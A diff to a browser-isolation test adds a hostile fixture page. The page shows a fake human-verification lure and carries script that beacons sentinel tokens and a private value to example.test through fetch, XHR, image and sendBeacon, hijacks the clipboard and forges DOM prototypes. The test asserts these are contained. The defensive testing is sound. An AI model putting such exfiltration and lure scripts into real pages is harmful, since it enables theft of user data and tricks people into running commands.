@@ -63,6 +63,10 @@ export async function checkCaptureBrowserIsolation(capture: Capture, launch: Lau
         <script src="https://static.example.test/app.js?token=sentinel"></script>
         <p>Verify you are human. Copy and paste the command into terminal.</p>
         <script>
+          fetch('https://example.test/data?token=sentinel').catch(() => {});
+          const request = new XMLHttpRequest(); request.open('GET', 'https://example.test/xhr'); request.send();
+          const image = new Image(); image.src = 'https://example.test/image'; document.body.append(image);
+          navigator.sendBeacon('https://example.test/beacon?token=sentinel', 'private-beacon-value');
           navigator.clipboard.writeText('private-clipboard-value').catch(() => {});
           Element.prototype.getAttribute = () => 'forged';
           Document.prototype.createTreeWalker = () => { throw new Error('forged'); };
@@ -79,7 +83,10 @@ export async function checkCaptureBrowserIsolation(capture: Capture, launch: Lau
     assert.ok(observations.requests.some(row => row.kind === 'script' && row.contentSha256?.length === 64));
     assert.ok(observations.requests.some(row => row.kind === 'frame'));
     assert.ok(observations.actionHints.includes('verification_prompt'));
-    assert.doesNotMatch(JSON.stringify(observations), /sentinel|private-form-value|private-clipboard-value|app\.js|forged/u);
+    for (const channel of ['fetch', 'xhr', 'image']) assert.ok(observations.coverage.attempts.some(row => row.channel === channel && row.state === 'observed' && row.collectionStarted), channel);
+    assert.ok(observations.coverage.attempts.some(row => row.channel === 'beacon' && row.state === 'refused' && row.reason === 'method' && !row.collectionStarted));
+    assert.equal(observations.coverage.interactions, 'not_exercised');
+    assert.doesNotMatch(JSON.stringify(observations), /sentinel|private-form-value|private-clipboard-value|private-beacon-value|app\.js|forged/u);
     assert.equal(connections, 0);
     return { directConnections: connections, rows };
   } finally {
